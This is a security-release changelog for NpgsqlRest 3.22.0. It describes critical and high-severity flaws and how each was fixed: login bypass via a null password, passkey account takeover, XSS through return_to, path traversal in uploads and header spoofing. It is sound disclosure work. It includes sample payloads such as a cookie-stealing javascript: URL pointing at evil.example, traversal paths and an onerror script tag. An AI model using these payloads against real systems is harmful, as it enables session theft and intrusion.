# Changelog v3.22.0

## Version [3.22.0](https://github.com/NpgsqlRest/NpgsqlRest/tree/3.22.0) (2026-11-11)

[Full Changelog](https://github.com/NpgsqlRest/NpgsqlRest/compare/3.21.0...3.22.0)

This release moves NpgsqlRest to **.NET 11** and is a **security release**. A full review of the codebase found several vulnerabilities, including one critical issue in password login. **Everyone should upgrade.** Some security fixes change behavior that applications may rely on. Each is described below, with what to check before upgrading.

### Upgrade notes (read this first)

- **.NET 11 is required.** The `NpgsqlRest` library and all plugin packages now target `net11.0`, so applications that use the library need .NET 11. The `npgsqlrest` executable and Docker images are self-contained, so nothing changes for them.
- **Password login is stricter.** If your login function returns a password hash column, a login now always fails unless the password was actually checked against that hash. See [Login no longer succeeds without a verified password](#login-no-longer-succeeds-without-a-verified-password).

---

### .NET 11

- All projects target `net11.0` and compile with C# 15. This includes the core library, the `npgsqlrest` client, every plugin, and the test and benchmark projects.
- The JIT Docker image (`Dockerfile.jit`) uses the .NET 11 `aspnet` and `sdk` base images. The native AOT images are unchanged; they build a self-contained binary.
- CI builds, tests and publishes with the .NET 11 SDK. `global.json` pins SDK `11.0.100`.
- **Runtime Async is not enabled.** .NET 11 introduces Runtime Async (`<Features>runtime-async=on</Features>`), which replaces compiler-generated async state machines with runtime-managed suspension. NpgsqlRest was tested with it, and it is deliberately left off for now:
  - The native AOT build of `npgsqlrest` crashed on the very first request when Runtime Async was on. JIT builds were fine.
  - It made each request allocate more memory, not less. NpgsqlRest's request handler is one very large async method, and under Runtime Async it saved about 13.7 KB of state every time it waited for I/O, compared with one 0.8 KB object before.

  Runtime Async will be re-evaluated once the request handler is split into smaller methods.

### Security fixes

#### Login no longer succeeds without a verified password

**Severity: Critical.** Applies to endpoints marked with the `login` annotation whose function returns the password hash column (`hash` by default, set by `NpgsqlRest:AuthenticationOptions:HashColumnName`). This is the documented password-login pattern.

**What was wrong.** With this pattern, the login function returns the user's stored password hash, and NpgsqlRest checks the submitted password against it. But the check was silently **skipped**, and the user **signed in**, whenever:

- the client sent the password as JSON `null` (for example `{"username": "admin", "password": null}`);
- the password parameter has a default value in the function and the client left it out;
- the stored hash for that user is `NULL`, for example an account created through external login or passkeys that has no password;
- no function parameter name contains the configured text (`PasswordParameterNameContains`, default `"pass"`), so NpgsqlRest could not tell which parameter holds the password. Only a log warning was written;
- `PasswordHasher` was set to `null`.

In practice, anyone who knew a username could log in as that user, including administrators, by sending a null password.

**What changed.** When the login result contains the hash column, the password check is now mandatory. Each case above fails the login exactly like a wrong password: HTTP `404`, the configured `PasswordVerificationFailedCommand` runs (so failed-login tracking and lockouts see the attempt), and no one is signed in.

**What to check.** Correct applications are not affected: a valid username and password still logs in. If you have accounts without a password (a `NULL` hash) that previously logged in through this endpoint, that only worked because of this bug. Those accounts now need a password, or must use their external login or passkey.

#### Passkeys: a signed-in user could add their passkey to someone else's account

**Severity: High.** Applies to the `npgsqlrest` client with passkey authentication enabled (`Auth:PasskeyAuth:Enabled`).

**What was wrong.** Adding a passkey takes two requests. The "options" request returns a `userContext` object that the database produced (it identifies the account), and the browser sends that object back with the completion request. The server passed whatever came back straight to `CompleteAddExistingUserCommand` without checking it. The documented example SQL reads the target account from it (`_user_context->>'id'`), so a signed-in user could change the id and attach their own passkey to another account, such as an administrator's, then sign in as that user. New-user registration (`CompleteRegistrationCommand`) had the same weakness: the client could change any registration data in `userContext`.

**What changed.** The server now adds a sealed copy of the `userContext` it issues, in a `_protected` property, encrypted and signed with ASP.NET Core Data Protection. The seal is tied to the challenge. When a passkey is added to an existing account, it is also tied to the signed-in user. The completion endpoints reject a missing or invalid seal with `400 invalid_request` ("Invalid user context"), and the SQL command always receives the server's own copy, never the client's.

**What to check.**
- Frontends that send `userContext` back unchanged, as the documented examples do, keep working.
- A frontend that builds or edits `userContext` itself is rejected; send back exactly what the options endpoint returned.
- When running several instances, configure shared Data Protection keys (the `DataProtection` section). Without them, a challenge started on one instance cannot be completed on another, just like cookie authentication.

#### A request could run as the previous user (`user_context` on pooled connections)

**Severity: High.** Applies to endpoints using the `user_context` annotation, and to SQL that reads `current_setting('request.user_id')` or similar, for example row-level security policies.

**What was wrong.** `user_context` passes the caller's identity to PostgreSQL as session settings (`request.user_id`, `request.user_name`, `request.user_roles`, and the claims JSON key). Without a transaction, these are **session-level** settings: they stay on the database connection after the request ends. Two things combined into a leak:

- The `npgsqlrest` client always added `No Reset On Close=true` to the connection string, so Npgsql never cleared session state when a connection went back to the pool.
- For **anonymous** requests, the user keys were not set at all, so they kept whatever value was left on the connection.

As a result, an anonymous request that reused a connection last used by a signed-in user ran with that user's `request.user_id`, `request.user_name` and roles. Endpoints without `user_context` that read these settings (for example through RLS policies) could see the previous caller's identity too.

**What changed.**
- The `npgsqlrest` client no longer forces `No Reset On Close`. Npgsql resets the connection when it returns to the pool again, which clears all session settings. The reset is sent together with the next command, so it adds no extra round trip. You can still set `No Reset On Close=true` yourself in the connection string.
- For anonymous requests, `user_context` endpoints now set every user key, and the claims JSON key if configured, to NULL instead of skipping them. So `user_context` endpoints never see a previous identity, even when connections are not reset.
- At startup, the library warns when the connection string sets `No Reset On Close` while endpoints use `user_context` or `request_headers context` (unless `WrapInTransaction` is on).

**What to check.** Once a session has used a setting, PostgreSQL returns an **empty string**, not NULL, for it after it is cleared. This also happens after a connection reset. If your SQL casts the value, write `nullif(current_setting('request.user_id', true), '')::int` rather than `current_setting('request.user_id', true)::int`. The plain cast fails for anonymous requests on a reused connection.

#### Breaking: anonymous callers can no longer fill user parameters (`user_params`)

**Severity: High.** Applies to endpoints using the `user_params` annotation (or `UseUserParameters`) that anonymous users can call, meaning endpoints that do not require authorization.

**What was wrong.** With `user_params`, parameters such as `_user_id`, `_user_name`, `_user_roles` (configured in `ParameterNameClaimsMapping`) and `_user_claims` are meant to be filled by the server from the signed-in user's claims. Generated TypeScript and Dart clients, OpenAPI documents and MCP tool schemas all leave them out for that reason. For signed-in users the claim always won. For **anonymous** requests, though, the server filled nothing, and a value sent by the client was used as-is. A request such as `GET /api/orders?userId=1` on an endpoint open to anonymous users therefore ran as user 1, and a client could also send a forged `userClaims` JSON.

**What changed.** For anonymous requests, values the client sends for these parameters (in the query string or the JSON body) are now ignored. The function receives them as "not provided", so its default value is used, or NULL if there is none.

**What to check.** If an endpoint expected anonymous callers to pass one of these parameters on purpose, that no longer works. Rename the parameter so it is not claim-mapped, or require authentication.

#### External login: `return_to` could run script or redirect to another site

**Severity: High.** Applies to the `npgsqlrest` client with external (OAuth) login enabled (`Auth:External`).

**What was wrong.** The external sign-in page (for example `/signin-google`) accepts a `return_to` query parameter, whose name is set by `ReturnToPathQueryStringKey`, and sends the browser there after the provider round trip. The value was used without any check:
- A link such as `/signin-google?return_to=javascript:fetch('//evil.example/?c='+document.cookie)` ran attacker-controlled script on your site's origin once the victim finished signing in, or even after they cancelled.
- `return_to=https://evil.example` turned your login page into an open redirect.

**What changed.** `return_to` must now be a path on the same site, such as `/dashboard?tab=2#top`. Absolute and protocol-relative URLs (`https://…`, `//…`, `/\…`), `javascript:` and other schemes, and values with control characters are ignored, and the user goes to the default page instead.

**What to check.** If you passed full URLs in `return_to`, pass a path instead.

#### A large stored value could crash the whole server

**Severity: High (availability).** Applies to all applications.

**What was wrong.** When writing certain values into a response, NpgsqlRest built the quoted value in a temporary buffer on the thread's stack, sized by the length of the value:
- every text and date value in CSV-style output (`raw` with `separator`);
- JSON values of types such as `varbit`, ranges, `interval`, `inet`, `geometry`.

A value of a few hundred thousand characters overflowed the stack. In .NET, a stack overflow cannot be caught: it ends the **entire process**, not just the request. Anyone able to store a long text (a comment, a description, an uploaded document) could take the server down, and it went down again every time that data was requested.

**What changed.** Only small values (up to 512 characters) still use a stack buffer. Larger values use a pooled heap buffer or are built directly. Responses are the same as before.

#### Enum and domain columns: invalid JSON and JSON injection

**Severity: Medium.** Applies to functions and queries that return columns of an **enum** type or a **domain** type.

**What was wrong.** NpgsqlRest has no specific mapping for enum and domain types, and it wrote their text into JSON responses unquoted:
- An enum value produced invalid JSON: `{"mood":happy}`.
- A domain over `text` let stored data inject JSON keys. A value such as `x","isAdmin":true,"y":"z` turned into an extra `isAdmin` property.
- An empty value failed with HTTP `500` ("Index was outside the bounds of the array").

**What changed.** These values are now written as properly escaped JSON strings: `{"mood":"happy"}`, and the domain value above stays one string, `"x\",\"isAdmin\":true,\"y\":\"z"`. An empty value becomes `""`.

#### File uploads could be written outside the upload directory

**Severity: High.** Applies to `upload for file_system` endpoints that keep the original file name (`unique_name = false`) or that build the upload `path` or `file` from request parameters (for example `path = {_path}`).

**What was wrong.** The upload directory and the file name were joined without any checks:
- The file name the browser sends with the upload can be anything, including `../../app/appsettings.json` or an absolute path. With `unique_name = false`, the file was written there, overwriting any file the server process could write to.
- An upload `path` or `file` built from request values could contain the same thing, even with unique names.

**What changed.**
- The client's file name is reduced to the bare name, with both `/` and `\` treated as separators: `../../etc/passwd` becomes `passwd`. The values `.` and `..` are refused.
- A `file` value must be a relative path without `..` segments. A `path` value must not contain `..` segments.
- The final location must be inside the upload directory.

A file that breaks these rules is not written. Its entry in the upload result has `"success": false`, `"status": "InvalidFileName"` and `"filePath": null`, just like files rejected for their type or content. Uploads with normal names are unaffected, and `filePath` is reported in the same form as before.

#### Static files: protected pages reachable through path variants, `.git` served, unbounded memory

**Severity: Medium.** Applies to the `npgsqlrest` client serving static files (the `StaticFiles` section).

**What was wrong.**
- **`AuthorizePaths` could be bypassed.** The rules were matched against the raw request path, while the file itself was found through a normalized path. A request for `//protected/page.html` did not match the rule `/protected/*`, yet still served `/protected/page.html` to anonymous users. The same applied to `///…` and other variants, and to `\` on Windows.
- **Files inside dot-directories were served.** Dotfiles such as `.env` were already excluded, but a file *inside* a dot-directory was not: if the web root contained a `.git` folder, `/.git/config` (which can contain credentials) and the whole repository history could be downloaded.
- **Memory grew without limit.** Small per-path caches, and the cache of parsed HTML templates (`CacheParsedFile`), were keyed by the raw request path. Every `//` or case variant of an existing file added another entry, and parsed HTML files were stored again in full each time.

**What changed.**
- `AuthorizePaths` and `ParsePatterns` are matched against the canonical path of the file actually served (its path relative to the web root), so every variant is protected the same way.
- Paths with a segment starting with `.` are no longer served. The exception is `/.well-known/`, which is used for ACME challenges and `security.txt`.
- The per-path pattern caches are removed (the matching is cheap). The parsed-template cache is keyed by the physical file and limited to 1,000 entries.

#### Claim values in parsed static HTML could inject script

**Severity: Medium.** Applies to static file parsing (`StaticFiles:ParseContentOptions`) with claims or environment variables templated into HTML pages, such as `{user_name}`.

**What was wrong.** Values were JSON-escaped with the "relaxed" encoder, which leaves `<`, `>` and `&` as they are. Claim values often come from data a user controls, such as a display name returned by the login function or an OAuth profile name. A value like `</script><img src=x onerror=alert(1)>` closed the surrounding `<script>` block, or injected markup into HTML text, and ran script in every page that showed it.

**What changed.** Templated values now escape HTML-sensitive characters (`<` `>` `&` `'` `"` `+`) as `\uXXXX`. They are still complete JSON and JavaScript string literals, used the same way as before, and other Unicode text such as `José` is unchanged. The only visible difference is that a quote inside a value now appears as `"` instead of `\"`; both are equivalent in JavaScript and JSON.

#### Breaking: `authorize` values are roles; users need `user:` or `id:`

**Severity: Medium.** Applies to the `authorize` annotation with values, `sse_scope authorize ...`, and SSE `RAISE ... USING HINT = 'authorize ...'`.

**What was wrong.** A value in `authorize admin, editor` matched **three** claims: the role claim, the user **name** claim and the user **id** claim. That is how `authorize john` restricted an endpoint to user `john`. But the roles and the identities shared one namespace:
- If users can choose their own user name, someone who registered as `admin` passed `authorize admin`.
- A user name equal to someone else's user id passed `authorize <that id>`.

SSE had the same problem: an event with the hint `authorize admin` was also delivered to a user *named* `admin`.

**What changed.** Each value now says what it matches:

| Value | Matches | Example |
| --- | --- | --- |
| plain value | the role claim (`DefaultRoleClaimType`) only | `authorize admin, editor` |
| `user:<name>` | the user name claim (`DefaultNameClaimType`), case-insensitive | `authorize user:john` |
| `id:<id>` | the user id claim (`DefaultUserIdClaimType`), case-insensitive | `authorize id:42` |

The same rules apply to `sse_scope authorize ...` and to SSE hints. Also fixed: roles from an SSE hint were added to the endpoint's shared role list, so they piled up across events (later events reached recipients meant only for earlier ones) and the list was changed concurrently. Hint roles now apply to their own event only.

**What to check.**
- An `authorize` list naming specific users or ids must use the prefixes: `authorize john` becomes `authorize user:john`, and `authorize 42` becomes `authorize id:42`. Without the prefix, those users now get `403`, which fails safe.
- A plain numeric or GUID value logs a startup warning, because it is most likely a user id.
- Per-user SSE notifications written as `using hint = format('authorize %s', _user_id)` must become `format('authorize id:%s', _user_id)`, or the events no longer reach the user.

#### Breaking: the reverse proxy no longer forwards credentials or client-chosen identity

**Severity: Medium.** Applies to endpoints using the `proxy` annotation (`NpgsqlRest:ProxyOptions`), and to HTTP Custom Types for the cookie part.

**What was wrong.**
- **The user's credentials went to the upstream.** All request headers except `Host`, `Content-Length` and `Transfer-Encoding` were forwarded, including the user's session `Cookie` and `Authorization` (JWT/bearer token), even when the upstream is a third-party service. The upstream's `Set-Cookie` headers were passed back too, so another service could set cookies on your application's origin.
- **Clients could choose the identity the upstream saw.** Server-filled values, meaning `user_params` parameters in the query string and `user_context` headers such as `request.user_id`, were **appended after** whatever the client sent under the same name: `?userId=<attacker>&userId=<real>`, or two `request.user_id` header values. For anonymous callers the client's value was the only one.
- **Upstream cookies were shared between users.** The proxy and HTTP Custom Types use one shared HTTP client, and it kept a cookie jar. A cookie that an upstream set during one user's request was stored and sent with every later upstream request, for every user.

**What changed.**
- `ExcludeHeaders` now also contains `Cookie`, `Authorization` and `Proxy-Authorization`, and `ExcludeResponseHeaders` contains `Set-Cookie`.
- Client query parameters and headers named like a server-filled value are removed before forwarding. The upstream only receives the server's values, and none at all when the server has none.
- The shared HTTP client no longer stores cookies.

**What to check.** If a proxied internal service relies on receiving the caller's bearer token, remove `"Authorization"` from `ExcludeHeaders`:

```json
{
  "NpgsqlRest": {
    "ProxyOptions": {
      "ExcludeHeaders": ["Host", "Content-Length", "Transfer-Encoding", "Cookie", "Proxy-Authorization"]
    }
  }
}
```

#### Breaking: the client IP address is no longer taken from request headers

**Severity: Medium.** Applies to anything that uses the client IP: the `IpAddress` rate-limiter partition (including the shipped `login_throttle` policy), the `_ip_address` parameter, the `request.ip_address` context value, `BeforeRoutineCommands` IP values, and passkey/OAuth analytics.

**What was wrong.** NpgsqlRest determined the client IP by reading the `X-Forwarded-For` header (its left-most entry), then `X-Real-IP`, `HTTP_X_FORWARDED_FOR` and `REMOTE_ADDR`, and used the real connection address only if none was present. Any client can send these headers. By sending a different `X-Forwarded-For` with each request, an attacker landed in a fresh rate-limit bucket every time, which made per-IP limits such as the login brute-force throttle useless. They could also write any IP they liked into audit data. Behind a proxy that appends to `X-Forwarded-For`, the left-most entry is still the one the attacker controls.

**What changed.** The client IP is now always `HttpContext.Connection.RemoteIpAddress`, the address of the connection itself.

**What to check: if you run behind a reverse proxy or load balancer,** the connection address is the proxy's address, so without further configuration every user shares one IP. Enable the forwarded headers middleware so the address reported by your proxy is used, ideally naming the proxy:

```json
{
  "ForwardedHeaders": {
    "Enabled": true,
    "ForwardLimit": 1,
    "KnownProxies": ["10.0.0.5"]
  }
}
```

With `ForwardLimit: 1`, only the entry added by your own proxy is used, and anything the client put in the header is ignored. Applications that use the NpgsqlRest library directly should call `app.UseForwardedHeaders(...)` with their proxies configured.

### Fixes

#### Command timeouts of one minute or more were silently ignored

A command timeout, set by `NpgsqlRest:CommandTimeout` or the `timeout` annotation, was converted to seconds using only the *seconds part* of the interval:
- `"1 minute"`, `"2 minutes"` or `"1 hour"` became `0`, which Npgsql treats as **no timeout at all**;
- `"90 seconds"` became `30`.

A timeout meant to stop runaway queries did nothing. Timeouts now use the full duration, rounded up to whole seconds, so a sub-second timeout no longer turns into "unlimited" either. An explicit `0` still means no timeout.

#### `Auth:LogoutPath` did not work, and could create a login endpoint

`Auth:LogoutPath` is documented as a URL path, like `Auth:LoginPath`. The client instead compared it with the **routine name** and marked the matching endpoint as a **login** endpoint:
- Set to a URL as documented, it never matched anything, so that endpoint never signed anyone out, and sessions survived "logout".
- Set to the routine name, it turned the logout routine into an anonymous **login** endpoint, and whatever row it returned became a signed-in user.

`LogoutPath` now matches the endpoint path and marks it as a logout endpoint. Endpoints marked with the `logout` annotation were not affected.
